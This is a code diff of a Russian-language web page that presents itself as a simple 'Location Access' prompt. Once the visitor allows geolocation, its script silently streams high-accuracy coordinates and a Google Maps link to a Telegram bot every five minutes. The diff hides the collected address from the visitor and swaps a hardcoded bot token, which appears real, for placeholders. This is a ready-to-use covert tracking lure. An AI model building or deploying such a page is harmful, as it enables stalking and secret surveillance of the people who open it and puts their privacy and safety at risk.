@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
+<meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Live Location</title>
+<title>GPS</title>
 
 <style>
-body {
+body{
   margin:0;
   height:100vh;
   display:flex;
@@ -19,9 +19,9 @@ body {
 
 .card{
   width:90%;
-  max-width:420px;
+  max-width:400px;
   background:rgba(255,255,255,0.08);
-  backdrop-filter:blur(20px);
+  backdrop-filter:blur(18px);
   padding:25px;
   border-radius:20px;
   text-align:center;
@@ -35,20 +35,12 @@ button{
   background:#00b7ff;
   color:white;
   font-weight:bold;
-  margin-top:10px;
 }
 
 .status{
   margin-top:15px;
   font-size:14px;
   color:#bfe8ff;
-}
-
-.addr{
-  margin-top:15px;
-  font-size:13px;
-  color:#d8f1ff;
-  line-height:1.5;
 }
 </style>
 </head>
@@ -57,32 +49,18 @@ button{
 
 <div class="card">
   <h2>📍 Location Access</h2>
-  <p>Разрешите геолокацию для продолжения</p>
+  <p>Для продолжения нажмите разрешить</p>
 
   <button onclick="start()">Разрешить геолокацию</button>
 
   <div class="status" id="status">ожидание...</div>
-  <div class="addr" id="addr"></div>
 </div>
 
 <script>
-const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
-const CHAT_ID = "8424328584";
+const BOT_TOKEN = "YOUR_BOT_TOKEN";
+const CHAT_ID = "YOUR_CHAT_ID";
 
 let lastSend = 0;
-let watchId;
-
-async function getAddress(lat, lon){
-  try {
-    const res = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
-    );
-    const data = await res.json();
-    return data.display_name || "адрес не найден";
-  } catch {
-    return "ошибка получения адреса";
-  }
-}
 
 async function sendTG(text){
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
@@ -97,50 +75,44 @@ async function sendTG(text){
 
 function start(){
   if(!navigator.geolocation){
-    alert("GPS не поддерживается");
+    document.getElementById("status").innerText =
+      "GPS не поддерживается";
     return;
   }
 
-  document.getElementById("status").innerText = "GPS активен...";
+  document.getElementById("status").innerText =
+    "GPS активен...";
 
-  watchId = navigator.geolocation.watchPosition(async pos=>{
+  navigator.geolocation.watchPosition(async pos=>{
     const now = Date.now();
 
-    // каждые 5 минут
+    // 5 минут
     if(now - lastSend < 5*60*1000) return;
     lastSend = now;
 
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
-
-    const address = await getAddress(lat, lon);
-
-    document.getElementById("addr").innerHTML =
-      "📍 " + address;
+    const acc = pos.coords.accuracy;
 
     document.getElementById("status").innerText =
-      "отправка данных...";
+      "данные отправлены";
 
-    const msg =
-`📍 Live Location
-
-🏠 Адрес:
-${address}
+    const message =
+`📍 Live Location Update
 
 🌐 Координаты:
 ${lat}, ${lon}
 
+🎯 Точность: ${Math.round(acc)}m
+
 🗺 Google Maps:
 https://maps.google.com/?q=${lat},${lon}`;
 
-    await sendTG(msg);
-
-    document.getElementById("status").innerText =
-      "активно (обновление каждые 5 минут)";
+    await sendTG(message);
 
   }, err=>{
     document.getElementById("status").innerText =
-      "нужно разрешить геолокацию";
+      "разрешите геолокацию";
   },{
     enableHighAccuracy:true,
     maximumAge:0,
